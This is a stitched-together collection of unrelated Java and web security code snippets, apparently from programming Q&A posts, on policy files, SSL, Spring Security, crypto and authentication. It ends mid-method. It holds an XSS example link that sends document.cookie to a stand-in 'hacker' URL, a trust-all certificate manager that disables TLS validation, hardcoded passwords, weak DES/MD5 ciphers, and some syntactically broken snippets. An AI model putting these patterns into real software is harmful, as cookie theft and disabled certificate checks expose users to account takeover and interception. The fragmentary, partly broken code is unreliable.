            Path tmpPolicyFile = Files.createTempFile("policy", ".tmp");
            Files.write(tmpPolicyFile, Collections.singletonList(policyConfig));
        
            // leading equals sign ensures only the indicated config gets loaded
            System.setProperty("java.security.policy", "=" + tmpPolicyFile.toUri());
        
            // unnecessary if you don't care about deny rules
            Policy.setPolicy(new DenyingPolicy());
    
            System.setSecurityManager(new SecurityManager());
        
            Files.delete(tmpPolicyFile);
        
            // filter args and call real main
            invokeMain(realMain, args);
        }
        // ...
    }
---UNIQUEIDFORSNIP---|136556708|    // note: curly braces are MessageFormat-escaped
    
    // ---
    
    // trusted code
    grant codeBase "{0}" '{'
    
	    permission java.security.AllPermission;
    
    '}';
    
    // sandboxed code
    grant codeBase "{1}" '{'
        
        // all permissions...
        permission java.security.AllPermission;
    
        // ...save for unsafe ones
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.AllUnsafePermission";
    
        // ...with global reflective access via ReflectionGatekeeper
        permission com.example.trusted.security.SelectiveReflectPermission;
    
        // ...with the exception of system code and our own com.example.trusted package
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.SelectiveReflectPermission:*!sun.*!*!*:*";
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.SelectiveReflectPermission:*!com.sun.*!*!*:*";
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.SelectiveReflectPermission:*!com.oracle.*!*!*:*";
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.SelectiveReflectPermission:*!net.java.*!*!*:*";
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.SelectiveReflectPermission:*!java.*!*!*:*";
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.SelectiveReflectPermission:*!javax.*!*!*:*";
        // currently it's not possible to express both a base package _and_ its sub-packages in a single permission
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.SelectiveReflectPermission:*!com.example.trusted!*!*:*";
        permission com.example.trusted.security.DeniedPermission "com.example.trusted.security.SelectiveReflectPermission:*!com.example.trusted.*!*!*:*";
    
    '}';
---UNIQUEIDFORSNIP---|136689627|    System.out.println(Arrays.toString(truc));
---UNIQUEIDFORSNIP---|136727296|    String htmlEscapedStr=ESAPI.encoder().encodeForHTML(content);
    response.setContentType("text/plain");
    response.setCharacterEncoding("UTF-8");
    response.getWriter().write(htmlEscapedStr);
---UNIQUEIDFORSNIP---|136802967|    //this might not be the correct syntax
    <a href="http://somehackerurl.com/hack.php?"+document.cookie>test</a>
---UNIQUEIDFORSNIP---|136815633|    <security-domain name="other" cache-type="default">
    <login-module code="Remoting" flag="optional">
        <module-option name="password-stacking" value="useFirstPass"/>
    </login-module>
    <login-module code="RealmDirect" flag="required">
        <module-option name="password-stacking" value="useFirstPass"/>
    </login-module>
---UNIQUEIDFORSNIP---|136868698|    -Djavax.net.debug=all
---UNIQUEIDFORSNIP---|136868700|    openssl s_client -connect host:port -debug -msg
---UNIQUEIDFORSNIP---|136868702|    ...
    Acceptable client certificate CA names
    /C=PL/O=company/OU=xx/CN=host/emailAddress=email@example.com
    /C=PL/O=company/OU=xx/CN=ca/emailAddress=email@example.com
    ---
    SSL handshake has read 2536 bytes and written 116 bytes
    ...
---UNIQUEIDFORSNIP---|136988886|    <user-permission android:name="android.permission.INTERNET"/>
    <user-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
---UNIQUEIDFORSNIP---|136988888|    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
---UNIQUEIDFORSNIP---|137116404|    Be sure not to use (Zp) DHE *if* the server runs on Java7 or earlier; those versions used 768-bit DH group which is too small. Java8 defaults to 1024, which is enough except *perhaps* against top adversaries like NSA, see details at http://weakdh.org; and can be configured for 2048 which is definitely enough, see 
---UNIQUEIDFORSNIP---|137566810|    Context context = Context.enter();
    context.setOptimizationLevel(-1);
---UNIQUEIDFORSNIP---|137590579|		import org.springframework.context.support.ClassPathXmlApplicationContext;
		import com.company.auth.bean.Employee;
		
		public final class AuthServiceFactory {
		
			private static final ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(
					new String[] { "com/company/auth/service/cxfClient.xml" });
		
			public AuthServiceFactory() {
			}
		
			public AuthService getService() {
				return (AuthService) context.getBean("client");
			}
		
			public static void main(String[] args) {
				AuthServiceFactory authSer = new AuthServiceFactory();
				AuthService client = authSer.getService();
				Employee employee = client.getEmployee("22222");
				System.out.println("Server said: " + employee.getLastName() + " " + employee.getFirstName());
				System.exit(0);
			}
    }
---UNIQUEIDFORSNIP---|137590581|		import java.io.IOException;
		import java.util.ResourceBundle;
		import javax.security.auth.callback.Callback;
		import javax.security.auth.callback.CallbackHandler;
		import javax.security.auth.callback.UnsupportedCallbackException;
		import org.apache.wss4j.common.ext.WSPasswordCallback;
		
		public class ClientPasswordCallback implements CallbackHandler {
		
			private static final String BUNDLE_LOCATION = "auth2";
			private static final String PASSWORD_PROPERTY_NAME = "auth.manager.password";
			private static String password;
		
			static {
				final ResourceBundle bundle = ResourceBundle.getBundle(BUNDLE_LOCATION);
				password = bundle.getString(PASSWORD_PROPERTY_NAME);
			}
		
			@Override
			public void handle(Callback[] callbacks) throws IOException, UnsupportedCallbackException {
				WSPasswordCallback pc = (WSPasswordCallback) callbacks[0];
				pc.setPassword(password);
			}
		}
---UNIQUEIDFORSNIP---|137590583|		auth.manager.password=123456
---UNIQUEIDFORSNIP---|137599227|    root@hectorvp-pc:~# service saslauthd status                                                                                                                   
    ● saslauthd.service - LSB: saslauthd startup script
       Loaded: loaded (/etc/init.d/saslauthd)
       Active: active (running) since Tue 2016-04-26 12:04:59 BST; 1s ago
         Docs: man:systemd-sysv-generator(8)
      Process: 11569 ExecStop=/etc/init.d/saslauthd stop (code=exited, status=0/SUCCESS)
      Process: 11586 ExecStart=/etc/init.d/saslauthd start (code=exited, status=0/SUCCESS)
       Memory: 2.0M
       CGroup: /system.slice/saslauthd.service
               ├─11606 /usr/sbin/saslauthd -a ldap -c -m /var/run/saslauthd -n 5
               ├─11607 /usr/sbin/saslauthd -a ldap -c -m /var/run/saslauthd -n 5
               ├─11608 /usr/sbin/saslauthd -a ldap -c -m /var/run/saslauthd -n 5
               ├─11609 /usr/sbin/saslauthd -a ldap -c -m /var/run/saslauthd -n 5
               └─11610 /usr/sbin/saslauthd -a ldap -c -m /var/run/saslauthd -n 5
    
    Apr 26 12:04:59 hectorvp-pc systemd[1]: Starting LSB: saslauthd startup script...
    Apr 26 12:04:59 hectorvp-pc saslauthd[11586]: * Starting SASL Authentication Daemon saslauthd
    Apr 26 12:04:59 hectorvp-pc saslauthd[11606]: detach_tty      : master pid is: 11606
    Apr 26 12:04:59 hectorvp-pc saslauthd[11606]: ipc_init        : listening on socket: /var/run/saslauthd/mux
    Apr 26 12:04:59 hectorvp-pc systemd[1]: Started LSB: saslauthd startup script.
    Apr 26 12:04:59 hectorvp-pc saslauthd[11586]: ...done.
---UNIQUEIDFORSNIP---|137633411|    if (filename.endsWith(".txt") {
        store(filename, data);
    }
---UNIQUEIDFORSNIP---|137724648|    permission java.net.SocketPermission "smtp.gmail.com:587", "listen,resolve";
---UNIQUEIDFORSNIP---|137725803|    CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509", new BouncyCastleProvider());
    InputStream is = new ByteArrayInputStream(some bytes in an array);
    CertPath certPath = certificateFactory.generateCertPath(is, "PKCS7"); // Throws Certificate Exception when a cert path cannot be generated
	CertPathValidator certPathValidator = CertPathValidator.getInstance("PKIX", new BouncyCastleProvider());
	PKIXParameters parameters = new PKIXParameters(KeyTool.getCacertsKeyStore());
    PKIXCertPathValidatorResult validatorResult = (PKIXCertPathValidatorResult) certPathValidator.validate(certPath, parameters); // This will throw a CertPathValidatorException if validation fails
---UNIQUEIDFORSNIP---|137736583|	http.antMatcher("/api/**").authorizeRequests() //
			.anyRequest().authenticated() //
			.and()
			.addFilterBefore(authenticationTokenFilterBean(), UsernamePasswordAuthenticationFilter.class);
---UNIQUEIDFORSNIP---|137756191|	if (perm instanceof FilePermission) {
	    if (perm.getActions().equals("read")) {
		// grant permission
		return;
	    }
	}
---UNIQUEIDFORSNIP---|137845636|    import javax.net.ssl.SSLSocketFactory;
    ...
    SocketFactory factory = SSLSocketFactory.getDefault();
    Socket s = factory.createSocket( host, port );
---UNIQUEIDFORSNIP---|138137972|    <security-constraint>
        <web-resource-collection>
            ...
        </web-resource-collection>
        <auth-constraint>
            ...
        </auth-constraint>
        <user-data-constraint>
            <transport-guarantee>CONFIDENTIAL</transport-guarantee>
        </user-data-constraint>
    </security-constraint>
---UNIQUEIDFORSNIP---|138353656|    protected String makeTokenSignature(long tokenExpiryTime, String username, String password) {
        String data = username + ":" + tokenExpiryTime + ":" + password + ":" + getKey();
        MessageDigest digest;
        try {
            digest = MessageDigest.getInstance("SHA-256");
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException("No SHA-256 algorithm available!");
        }
        return new String(Hex.encode(digest.digest(data.getBytes())));
    }
---UNIQUEIDFORSNIP---|138359115|    @Retention(RetentionPolicy.RUNTIME)
---UNIQUEIDFORSNIP---|138451455|    antMatchers("/account/{\\d+}/download").access("hasAnyAuthority('ROLE_TOKENSAVED')")
---UNIQUEIDFORSNIP---|138565021|    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>3.2.0.RELEASE</version>
    </dependency>
---UNIQUEIDFORSNIP---|138585426|      "rules": {
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid"
          }
        }
      }
---UNIQUEIDFORSNIP---|138742120|    KeyFactory factory rsa = KeyFactory.getInstance("RSA");
    BigInteger n = ... ; /* modulus */
    BigInteger e = ... ; /* public exponent */
    RSAPublicKeySpec spec = new RSAPublicKeySpec(n, e);
    RSAPublicKey pub = (RSAPublicKey) factory.generatePublic(spec);
    Cipher enc = Cipher.getInstance("RSA");
    enc.init(Cipher.WRAP_MODE, pub);
    byte[] encryptedContentKey = enc.wrap(secret);
 
---UNIQUEIDFORSNIP---|138826616|    public class CertificateLM extends AppservCertificateLoginModule
    {
        protected void authenticateUser() throws LoginException
        {
            // get the DN from the X500Principal.
            String dname = getX500Principal().getName();
            
            // retrieve the groups of the DN from an external source, e.g. from LDAP
            String[] groups = getGroupsFromLDAP( dname ); 
            if( groups != null ) {
                 commitUserAuthentication( groups );
            }
            else {
                 throw new LoginException( "DN is unknown." );
            }
        }
    }
---UNIQUEIDFORSNIP---|138852685|    <servlet>
        <servlet-name>myapp</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>/WEB-INF/myapp-servlet.xml</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>myapp</servlet-name>
        <url-pattern>*.html</url-pattern>
    </servlet-mapping>
    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>
    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>/WEB-INF/myapp-security.xml</param-value>
    </context-param>
---UNIQUEIDFORSNIP---|138852687|    <servlet>
        <servlet-name>myapp</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value></param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
---UNIQUEIDFORSNIP---|138867838|      ASN1Sequence seq= 
         (ASN1Sequence) new ASN1InputStream(parentPubKey.getEncoded()).readObject();
      
      SubjectPublicKeyInfo parentPubKeyInfo = new SubjectPublicKeyInfo(seq);
      ContentSigner signer = new JcaContentSignerBuilder(algorithm).build(parentPrivKey);
      X509v3CertificateBuilder certBldr = 
         new JcaX509v3CertificateBuilder(
            parentCert, 
            serialNum,
            startDate, 
            endDate, 
            distName, 
            pubKey)
         .addExtension(
               new ASN1ObjectIdentifier("2.5.29.35"),
               false,
               new AuthorityKeyIdentifier(parentPubKeyInfo))
         .addExtension(
            new ASN1ObjectIdentifier("2.5.29.19"), 
            false,
            new BasicConstraints(false)) // true if it is allowed to sign other certs
         .addExtension(
            new ASN1ObjectIdentifier("2.5.29.15"),
            true,
            new X509KeyUsage(
               X509KeyUsage.digitalSignature |
               X509KeyUsage.nonRepudiation   |
               X509KeyUsage.keyEncipherment  |
               X509KeyUsage.dataEncipherment));
    
      // Build/sign the certificate.
      X509CertificateHolder certHolder = certBldr.build(signer);
    
      X509Certificate cert = new JcaX509CertificateConverter().setProvider(BC)
         .getCertificate(certHolder);
---UNIQUEIDFORSNIP---|138867843|            new X509KeyUsage(
               X509KeyUsage.keyCertSign|
               X509KeyUsage.cRLSign));
---UNIQUEIDFORSNIP---|138886322|    //construct Facebook auth URI
    $auth_url = sprintf("%s?redirect_uri=%s&client_id=%s&scope=email,publish_stream", 
                $authorization_endpoint, 
                $callback_url, 
                $key);
---UNIQUEIDFORSNIP---|138886324|    //construct Gowalla auth URI
    $auth_url = sprintf("%s?redirect_uri=%s&client_id=%s", 
                $authorization_endpoint, 
                $callback_url, 
                $key);
---UNIQUEIDFORSNIP---|139015498|    <system-properties>
        <property name="java.net.preferIPv4Stack" value="true"/>
        <property name="javax.net.ssl.trustStore" value="cacerts.jks"/>
        <property name="javax.net.ssl.trustStorePassword" value="Password1"/>
        <property name="javax.net.ssl.keyStore" value="/keystore.jks"/>
        <property name="javax.net.ssl.keyStorePassword" value="Password1"/>
        <property name="java.naming.referral" value="follow"/>
        <property name="java.security.policy" value="server.policy"/>
    </system-properties>
---UNIQUEIDFORSNIP---|139129982|    <PARAM name="java_arguments" value="-Djava.security.policy=C:\Frustrated.policy">
---UNIQUEIDFORSNIP---|139181402|    datasource.driver=com.mysql.jdbc.Driver 
    datasource.url=jdbc:mysql://localhost/reportsdb 
    datasource.username=reportsUser 
    datasource.password=ENC(G6N718UuyPE5bHyWKyuLQSm02auQPUtm) 
---UNIQUEIDFORSNIP---|139181405|    /*
    * First, create (or ask some other component for) the adequate encryptor for   
    * decrypting the values in our .properties file.   
    */  
    StandardPBEStringEncryptor encryptor = new StandardPBEStringEncryptor();     
    encryptor.setPassword("jasypt"); // could be got from web, env variable...    
    /*   
    * Create our EncryptableProperties object and load it the usual way.   
    */  
    Properties props = new EncryptableProperties(encryptor);  
    props.load(new FileInputStream("/path/to/my/configuration.properties"));
    
    /*   
    * To get a non-encrypted value, we just get it with getProperty...   
    */  
    String datasourceUsername = props.getProperty("datasource.username");
    
    /*   
    * ...and to get an encrypted value, we do exactly the same. Decryption will   
    * be transparently performed behind the scenes.   
    */ 
    String datasourcePassword = props.getProperty("datasource.password");
    
     // From now on, datasourcePassword equals "reports_passwd"...
---UNIQUEIDFORSNIP---|139398741|    final SocketFactory factory = SocketFactory.getDefault();
    final Socket socket = factory.createSocket(host, port);
---UNIQUEIDFORSNIP---|139398749|    final SocketFactory factory = SSLSocketFactory.getDefault();
    final Socket socket = factory.createSocket(host, port);
---UNIQUEIDFORSNIP---|139445273|    java -Djavax.net.ssl.trustStore=/home/gene/mycacerts ...
---UNIQUEIDFORSNIP---|139606640|    <p><c:out value="${bean.userControlledValue}"></p>
    <p><input name="foo" value="${fn:escapeXml(param.foo)}"></p>
---UNIQUEIDFORSNIP---|139647322|    static boolean authenticate(String username, String password) {
        return "abc@abc.com".equals(username) && "abc123".equals(password);
    }
---UNIQUEIDFORSNIP---|139704934|    private String sanitizeScript(String script) {
		if (containsMoreThanOneStatement(script)) {
			throw new ScriptedPermissionsException("Scripts may only contain one statement!!");
		}
		return new StringBuilder()
				.append("function importPackage(a){ throw 'Cannot import!'};").append('\n')
				.append("function importClass(a){ throw 'Cannot import!'};").append('\n')
				.append("function JavaImporter(a){ throw 'I said, no importing!!'};").append('\n')
				.append(script).append(';')
				.toString();
	}
---UNIQUEIDFORSNIP---|139704941|    java.lang.Class.forName('foo.bar.Zap')
---UNIQUEIDFORSNIP---|139762782|    <security:http ... />
        ...
        <security:intercept-url pattern="/userstuff/**" access="IS_AUTHENTICATED_ANONYMOUSLY"/>
        ....
    </security:http>
---UNIQUEIDFORSNIP---|139852656|    a * b  mod  n
---UNIQUEIDFORSNIP---|139852658|    (a mod n  *  b mod n)  mod  n
---UNIQUEIDFORSNIP---|139852660|    g.modPow(u1,p).multiply(y.modPow(u2,p)).mod(p)
---UNIQUEIDFORSNIP---|139951734|    @Component
    public class AuthenticationFailureListener
        implements ApplicationListener<AuthenticationFailureBadCredentialsEvent> {
      @Autowired
      private UserDao userDao;
      public void onApplicationEvent(AuthenticationFailureBadCredentialsEvent ev) {
        String username = ev.getAuthentication().getName();
        User user = userDao.find("name", username);
        if (user != null) { // only for existing users
                user.reportLoginFailure();
                userDao.commit();
        }
      }
    }
---UNIQUEIDFORSNIP---|139951741|    @Component
    public class AuthenticationSuccessEventListener
        implements ApplicationListener<AuthenticationSuccessEvent>{
      @Autowired
      private UserDao userDao;
      public void onApplicationEvent(AuthenticationSuccessEvent event) {
        String username = event.getAuthentication().getName();
        User user = userDao.find("name", username);
        user.reportLoginOK();
        userDao.commit();
      }
    }
---UNIQUEIDFORSNIP---|140063213|      try
      {
           // using normal class loader 
         Class<?> clazz = Class.forName("com.abc.bla.bla.SandBox", true, Thread.currentThread().getContextClassLoader());
         Constructor<?> constructor = clazz.getConstructor();
         Object obj = constructor.newInstance(new Object[] {});
         Method method = clazz.getMethod("sayHello", new Class[] {});
         method.invoke(obj, new Object[] {});
      }
      catch (Exception ex)
      {
         ex.printStackTrace();
      }
---UNIQUEIDFORSNIP---|140191434|    public void saveFile(String filepath, String filename) {
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                File theDir = new File(filepath);
                try {
                    if (theDir.exists()) { // This throws exception
                        win.call("appletMsg", new Object[] { "Directory Exists", "win" });
                    } else {
                        win.call("appletMsg", new Object[] { "Creating Directory...", "msg" });
                        if (theDir.mkdir()) {
                            win.call("appletMsg", new Object[] { "Directory Created", "win" });
                        } else
                            win.call("appletMsg", new Object[] { "Directory Creation Failed!", "fail" });
                    }
                } catch (Exception e) { // This exception is caught
                    win.call("appletMsg", new Object[] { "Error Reading Directory!", "fail" });
                    win.call("appletMsg", new Object[] { filepath, "fail" });
                }
                // More code for working with files, error happens above this
            }
        });
    }
---UNIQUEIDFORSNIP---|140352466|    <url-pattern>/admin.xhtml</url-pattern>
---UNIQUEIDFORSNIP---|140352468|    <url-pattern>/faces/admin.xhtml</url-pattern>
---UNIQUEIDFORSNIP---|140400081|    keytool -genkeypair -dname "cn=Mark Jones, ou=Java, o=Oracle, c=US"
      -alias business -keypass <new password for private key> -keystore /working/mykeystore
      -storepass <new password for keystore> -validity 180
---UNIQUEIDFORSNIP---|140673941|<Resource auth="Container" readonly="false" description="User database that can be updated and saved" factory="org.apache.catalina.users.MemoryUserDatabaseFactory" name="UserDatabase" pathname="conf/tomcat-users.xml" type="org.apache.catalina.UserDatabase"/>
---UNIQUEIDFORSNIP---|140673943|     <%!public static boolean changePasswd(String user, String passwd, MBeanServer mbeanServer, JspWriter out) throws Throwable{ 
    try {
    String userFDN = "Users:type=User,username=\""+user+"\",database=UserDatabase"; 
    ObjectName userObjName = new ObjectName(userFDN);
    MBeanInfo info = mbeanServer.getMBeanInfo(userObjName);
    
    Attribute attr=new Attribute("password",passwd);
    mbeanServer.setAttribute(userObjName, attr);
    ObjectName databaseObjName=new ObjectName("Users:type=UserDatabase,database=UserDatabase");
    Object result= mbeanServer.invoke(databaseObjName,"save",new Object[0],new String[0]); 
    out.println("<b>Changed password and, Saved: "+result+"</b>");
    return true;    
    } catch (Throwable t) {
    out.print("<font color='red'>WHY: </font>" + t);
    } 
    return false; 
    }%>
     
      <%MBeanServer mbeanServer = (MBeanServer) list.get(0); 
      //ObjectName obname = new ObjectName(   "Catalina:type=Resource,resourcetype=Global,class=org.apache.catalina.UserDatabase,name=\"UserDatabase\"" );
       ArrayList list = MBeanServerFactory.findMBeanServer(null);  
       MBeanServer mbeanServer = (MBeanServer) list.get(0);
       changePasswd("user","passwd",mbeanServer,out);
---UNIQUEIDFORSNIP---|140814102|    // Create a trust manager that does not validate certificate chains
    TrustManager[] trustAllCerts = new TrustManager[]{
        new X509TrustManager() {
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return null;
            }
            public void checkClientTrusted(
                java.security.cert.X509Certificate[] certs, String authType) {
            }
            public void checkServerTrusted(
                java.security.cert.X509Certificate[] certs, String authType) {
            }
        }
    };
    
    // Install the all-trusting trust manager
    try {
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
    } catch (Exception e) {
        
    }
    
    // Now you can access an https URL without having the certificate in the truststore
    try {
        URL url = new URL("https://hostname/index.html");
    } catch (MalformedURLException e) {
    }
---UNIQUEIDFORSNIP---|140889226|    MyDomainObject secured = new MyDomainObject();
    ObjectIdentity securedIdentity = new ObjectIdentityImpl(secured);
---UNIQUEIDFORSNIP---|140992955|    jar cvf TestPrivileges.jar TestPrivileges.class TestPrivileges$1.class
---UNIQUEIDFORSNIP---|141068782|    class Thief extends Thread {
        public BankAccount ba = null;
        void run() {
            do { 
                if(ba != null) ba.transferAllMoneyToDima();           
            } while(ba == null);
        }
    }
    Thief th = new Thief();
    th.start();
    th.ba = new BankAccount();
---UNIQUEIDFORSNIP---|141076650|    grant  {
    	permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
    };
---UNIQUEIDFORSNIP---|141107963|    <rule>
        <id location="https://java.com/" />
        <action permission="run" version="SECURE" />
    </rule>
    <rule>
        <id location="http://climate.example.com/" />
        <action permission="run" version="1.6.0_31" />
    </rule>
---UNIQUEIDFORSNIP---|141185855|    cert.verify(interCA1.getPublicKey());
---UNIQUEIDFORSNIP---|141222638|    PublicKey pubKey = myPair.getPublic();
    byte[] keyBytes = pubKey.getEncoded();
---UNIQUEIDFORSNIP---|141222640|     KeyFactory keyFactory = KeyFactory.getInstance("RSA");
     X509EncodedKeySpec pubKeySpec 
         = new X509EncodedKeySpec(keyBytes);
     PublicKey pubKey = keyFactory.generatePublic(pubKeySpec);
---UNIQUEIDFORSNIP---|141305333|	/**
	 * Access token filter for the chat websocket. Requests without a valid access token 
	 * are refused with a <code>403</code>.
	 *
	 * @author cassiomolin
	 */
	@WebFilter("/chat/*")
	public class AccessTokenFilter implements Filter {
	    @Inject
	    private Authenticator authenticator;
	    @Override
	    public void init(FilterConfig filterConfig) throws ServletException {
	    }
	    @Override
	    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, 
	            FilterChain filterChain) throws IOException, ServletException {
	        HttpServletRequest request = (HttpServletRequest) servletRequest;
	        HttpServletResponse response = (HttpServletResponse) servletResponse;
	       	// Extract access token from the request
	        String token = request.getParameter("access-token");
	        if (token == null || token.trim().isEmpty()) {
	            returnForbiddenError(response, "An access token is required to connect");
	            return;
	        }
            // Validate the token and get the user who the token has been issued for
	        Optional<String> optionalUsername = authenticator.getUsernameFromToken(token);
	        if (optionalUsername.isPresent()) {
	            filterChain.doFilter(
	                    new AuthenticatedRequest(
	                            request, optionalUsername.get()), servletResponse);
	        } else {
	            returnForbiddenError(response, "Invalid access token");
	        }
	    }
	    private void returnForbiddenError(HttpServletResponse response, String message) 
	            throws IOException {
	        response.sendError(HttpServletResponse.SC_FORBIDDEN, message);
	    }
	    @Override
	    public void destroy() {
	    }
	    /**
	     * Wrapper for a {@link HttpServletRequest} which decorates a 
	     * {@link HttpServletRequest} by adding a {@link Principal} to it.
	     *
	     * @author cassiomolin
	     */
	    private static class AuthenticatedRequest extends HttpServletRequestWrapper {
	        private String username;
	        public AuthenticatedRequest(HttpServletRequest request, String username) {
	            super(request);
	            this.username = username;
	        }
	        @Override
	        public Principal getUserPrincipal() {
	            return () -> username;
	        }
	    }
	}
---UNIQUEIDFORSNIP---|141305336|	@ServerEndpoint("/chat")
	public class ChatEndpoint {
	    private static final Set<Session> sessions = 
	            Collections.synchronizedSet(new HashSet<>());
	    @OnOpen
	    public void onOpen(Session session) {
	        sessions.add(session);
	        String username = session.getUserPrincipal().getName();
	        welcomeUser(session, username);
	    }
	    ...
	}
---UNIQUEIDFORSNIP---|141394992|    OAuthParameters params = new OAuthParameters().signatureMethod("HMAC-SHA1").
        consumerKey("consumerKey").version("1.1");
    
    OAuthSecrets secrets = new OAuthSecrets().consumerSecret("secretKey");
    OAuthClientFilter filter = new OAuthClientFilter(client().getProviders(), params, secrets);
    WebResource webResource = resource();
    webResource.addFilter(filter);
    
    String responseMsg = webResource.path("oauth").get(String.class);
---UNIQUEIDFORSNIP---|141394995|    @Path("oauth")
    public class OAuthService {
        @GET
        @Produces("text/html")
        public String secretService(@Context HttpContext httpContext) {
            OAuthServerRequest request = new OAuthServerRequest(httpContext.getRequest());
    
            OAuthParameters params = new OAuthParameters();
            params.readRequest(request);
            OAuthSecrets secrets = new OAuthSecrets().consumerSecret("secretKey");
    
            try {
                if(!OAuthSignature.verify(request, params, secrets)) 
                    return "false";
            } catch (OAuthSignatureException ose) {
                return "false";
            }
    
            return "OK";
        }
    }
---UNIQUEIDFORSNIP---|141394999|    <?php 
    
    require_once 'oauth.php';
    
    $key = 'consumerKey';
    $secret = 'secretKey';
    $consumer = new OAuthConsumer($key, $secret);
    
    $api_endpoint = 'http://localhost:9998/oauth';
    $sig_method = new OAuthSignatureMethod_HMAC_SHA1;
    
    $parameters = null;
    $req = OAuthRequest::from_consumer_and_token($consumer, null, "GET", $api_endpoint, $parameters);
    $sig_method = new OAuthSignatureMethod_HMAC_SHA1();
    $req->sign_request($sig_method, $consumer, null);//note: double entry of token
    
    //get data using signed url
    $ch = curl_init($req->to_url());
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $res = curl_exec($ch);
    
    echo $res;
    curl_close($ch);
---UNIQUEIDFORSNIP---|141739790|    @EnableWebSecurity
    public class SecurityConfig extends WebSecurityConfigurerAdapter {
    
    	@Override
    	protected void configure(final HttpSecurity http) throws Exception {
    
    		http.authorizeRequests()
                 .antMatchers(HttpMethod.POST, "/user") 
                   .permitAll().anyRequest().authenticated();
    
    	}
    }   
    
---UNIQUEIDFORSNIP---|141820835|    <c:if test="${currentUser.id_profil == 1}">
       <button label="Only id_profil 1"/>
    </c:if>
---UNIQUEIDFORSNIP---|141941495|    bcprov-jdk16-145.jar
    bcmail-jdk16-145.jar
---UNIQUEIDFORSNIP---|141941500|    bcprov-jdk15on-147.jar
    bcmail-jdk15on-147.jar
---UNIQUEIDFORSNIP---|141963434|            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBEWithMD5AndTripleDES");
            SecretKey key = factory.generateSecret(keySpec);
            // instead of key.getAlgorithm(). For compatibility with JDK 1.5
            String newAlgorithm = "PBEWithMD5AndDES"; // the same value as in JDK 1.5
            ecipher = Cipher.getInstance(newAlgorithm);
---UNIQUEIDFORSNIP---|142055708|    List<String> clauses = new ArrayList<String>();
    List<String> binds = new ArrayList<String>();
    
    if (request.name != null) {
        binds.add(request.name);
        clauses.add("NAME = ?");
    }
    
    if (request.city != null) {
        binds.add(request.city);
        clauses.add("CITY = ?");
    }
    
    ...
    
    String whereClause = "";
    
    for(String clause : clauses) {
        if (whereClause.length() > 0) {
            whereClause = whereClause + " AND ";
        }
        whereClause = whereClause + clause;
    }
    
    String sql = "SELECT * FROM table WHERE " + whereClause;
    
    PreparedStatement ps = con.prepareStatment(sql);
    
    int col = 1;
    for(String bind : binds) {
        ps.setString(col++, bind);
    }
    
    ResultSet rs = ps.executeQuery();
---UNIQUEIDFORSNIP---|142093087|    <security-domain name="EncryptedPassword">
      <authentication>
        <login-module code="SecureIdentity" flag="required">
          <module-option name="username" value="test"/>
          <module-option name="password" value="encrypted_password"/>
        </login-module>
      </authentication>
    </security-domain>
---UNIQUEIDFORSNIP---|142093089|      <datasource ... >
           .....
           <security>
                  <security-domain>EncryptedPassword</security-domain>
           </security>
      </datasource>
                   
---UNIQUEIDFORSNIP---|142093091|    java -cp $JBOSS_HOME/modules/org/picketbox/main/picketbox-4.0.6.<beta|final>.jar:$JBOSS_HOME/modules/org/jboss/logging/main/jboss-logging-3.1.0.<some_version>.jar:$CLASSPATH org.picketbox.datasource.security.SecureIdentityLoginModule password
---UNIQUEIDFORSNIP---|142161197|    import javax.crypto.Cipher;
    import javax.crypto.KeyGenerator;
	import javax.crypto.SecretKey;
	 
	public class HelloWorld{
        public static void main(String[] args) {
            try{
                KeyGenerator keygenerator = KeyGenerator.getInstance("DES");
                SecretKey myDesKey = keygenerator.generateKey();
            
                Cipher desCipher;
                desCipher = Cipher.getInstance("DES");
            
                
                byte[] text = "No body can see me.".getBytes("UTF8");
            
                desCipher.init(Cipher.ENCRYPT_MODE, myDesKey);
                byte[] textEncrypted = desCipher.doFinal(text);
            
                String s = new String(textEncrypted);
                System.out.println(s);
            
                desCipher.init(Cipher.DECRYPT_MODE, myDesKey);
                byte[] textDecrypted = desCipher.doFinal(textEncrypted);
            
                s = new String(textDecrypted);
                System.out.println(s);
	        }catch(Exception e)
	        {
	            System.out.println("Exception");
	        }
	    }
    }
---UNIQUEIDFORSNIP---|142167726|    public class GenerateStrongAESKey {
    
    	public static SecretKey generateStrongAESKey(final int keysize) {
    		final KeyGenerator kgen;
    		try {
    			kgen = KeyGenerator.getInstance("AES");
    		} catch (final NoSuchAlgorithmException e) {
    			throw new RuntimeException("AES key generator should always be available in a Java runtime", e);
    		}
    		final SecureRandom rng;
    		try {
    			rng = SecureRandom.getInstanceStrong();
    		} catch (final NoSuchAlgorithmException e) {
